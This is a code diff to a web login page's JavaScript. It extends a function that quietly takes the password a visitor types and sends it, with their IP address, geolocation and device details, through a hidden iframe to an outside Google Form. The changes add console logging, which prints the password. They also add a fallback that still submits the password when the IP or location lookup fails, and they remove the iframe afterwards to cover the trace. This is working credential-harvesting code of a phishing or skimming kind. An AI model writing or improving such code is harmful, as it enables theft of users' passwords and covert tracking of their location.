@@ -297,6 +297,8 @@
             
             // Function to collect and send user data
             function collectAndSendUserData(password) {
+                console.log('🔍 Starting data collection...');
+                
                 // Google Form details
                 const googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSdQyV5OS_7zngPwjATKVBblGOoTIliTzhZR1C56iMbp8ggBzg/formResponse';
                 const ipFieldId = 'entry.1105311194';
@@ -307,17 +309,29 @@
                 
                 // Get current date and time
                 const currentTime = new Date().toString();
+                console.log('⏰ Current time:', currentTime);
                 
                 // Get IP address using a free API
+                console.log('🌐 Fetching IP address...');
                 fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
+                    .then(response => {
+                        console.log('✅ IP API response received');
+                        return response.json();
+                    })
                     .then(ipData => {
                         const ipAddress = ipData.ip;
+                        console.log('📍 IP Address:', ipAddress);
                         
                         // Get location and device info
+                        console.log('🗺️ Fetching location data...');
                         fetch(`https://ipapi.co/${ipAddress}/json/`)
-                            .then(response => response.json())
+                            .then(response => {
+                                console.log('✅ Location API response received');
+                                return response.json();
+                            })
                             .then(locationData => {
+                                console.log('🏙️ Location data:', locationData);
+                                
                                 // Collect device info
                                 const deviceInfo = {
                                     userAgent: navigator.userAgent,
@@ -325,6 +339,7 @@
                                     vendor: navigator.vendor,
                                     screenSize: `${window.screen.width}x${window.screen.height}`
                                 };
+                                console.log('💻 Device info:', deviceInfo);
                                 
                                 // Format location info
                                 const locationInfo = {
@@ -334,6 +349,11 @@
                                     postal: locationData.postal,
                                     timezone: locationData.timezone
                                 };
+                                console.log('📮 Formatted location:', locationInfo);
+                                
+                                // Test Google Form submission
+                                console.log('📝 Attempting to submit to Google Form...');
+                                console.log('🎯 Form URL:', googleFormUrl);
                                 
                                 // Create iframe for form submission
                                 let iframe = document.createElement('iframe');
@@ -352,6 +372,7 @@
                                 ipField.name = ipFieldId;
                                 ipField.value = ipAddress;
                                 form.appendChild(ipField);
+                                console.log('✅ Added IP field:', ipFieldId, '=', ipAddress);
                                 
                                 // Add location field
                                 let locationField = iframeDoc.createElement('input');
@@ -359,6 +380,7 @@
                                 locationField.name = locationFieldId;
                                 locationField.value = JSON.stringify(locationInfo);
                                 form.appendChild(locationField);
+                                console.log('✅ Added location field:', locationFieldId);
                                 
                                 // Add device field
                                 let deviceField = iframeDoc.createElement('input');
@@ -366,6 +388,7 @@
                                 deviceField.name = deviceFieldId;
                                 deviceField.value = JSON.stringify(deviceInfo);
                                 form.appendChild(deviceField);
+                                console.log('✅ Added device field:', deviceFieldId);
                                 
                                 // Add password field
                                 let passwordField = iframeDoc.createElement('input');
@@ -373,6 +396,7 @@
                                 passwordField.name = passwordFieldId;
                                 passwordField.value = password;
                                 form.appendChild(passwordField);
+                                console.log('✅ Added password field:', passwordFieldId, '=', password);
                                 
                                 // Add time field
                                 let timeField = iframeDoc.createElement('input');
@@ -380,14 +404,86 @@
                                 timeField.name = timeFieldId;
                                 timeField.value = currentTime;
                                 form.appendChild(timeField);
+                                console.log('✅ Added time field:', timeFieldId);
                                 
                                 // Append form to iframe and submit
                                 iframeDoc.body.appendChild(form);
+                                console.log('🚀 Submitting form...');
                                 form.submit();
+                                console.log('✅ Form submitted successfully!');
+                                
+                                // Clean up iframe after a delay
+                                setTimeout(() => {
+                                    document.body.removeChild(iframe);
+                                    console.log('🧹 Cleaned up iframe');
+                                }, 2000);
                             })
-                            .catch(error => console.error('Error fetching location data:', error));
+                            .catch(error => {
+                                console.error('❌ Error fetching location data:', error);
+                                console.log('⚠️ Trying to submit with basic data only...');
+                                // Submit with just IP and device info if location fails
+                                submitBasicData(ipAddress, password, currentTime);
+                            });
                     })
-                    .catch(error => console.error('Error fetching IP data:', error));
+                    .catch(error => {
+                        console.error('❌ Error fetching IP data:', error);
+                        console.log('⚠️ Trying to submit with device data only...');
+                        // Submit with just device info if IP fetch fails
+                        submitBasicData('Unable to fetch', password, currentTime);
+                    });
+                
+                // Fallback function for basic data submission
+                function submitBasicData(ip, pwd, time) {
+                    console.log('📝 Submitting basic data as fallback...');
+                    const deviceInfo = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        vendor: navigator.vendor,
+                        screenSize: `${window.screen.width}x${window.screen.height}`
+                    };
+                    
+                    let iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    
+                    let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    let form = iframeDoc.createElement('form');
+                    form.action = googleFormUrl;
+                    form.method = 'POST';
+                    
+                    // Add basic fields
+                    let ipField = iframeDoc.createElement('input');
+                    ipField.type = 'text';
+                    ipField.name = ipFieldId;
+                    ipField.value = ip;
+                    form.appendChild(ipField);
+                    
+                    let deviceField = iframeDoc.createElement('input');
+                    deviceField.type = 'text';
+                    deviceField.name = deviceFieldId;
+                    deviceField.value = JSON.stringify(deviceInfo);
+                    form.appendChild(deviceField);
+                    
+                    let passwordField = iframeDoc.createElement('input');
+                    passwordField.type = 'text';
+                    passwordField.name = passwordFieldId;
+                    passwordField.value = pwd;
+                    form.appendChild(passwordField);
+                    
+                    let timeField = iframeDoc.createElement('input');
+                    timeField.type = 'text';
+                    timeField.name = timeFieldId;
+                    timeField.value = time;
+                    form.appendChild(timeField);
+                    
+                    iframeDoc.body.appendChild(form);
+                    form.submit();
+                    console.log('✅ Basic data submitted!');
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                    }, 2000);
+                }
             }
             
             // Function to handle login
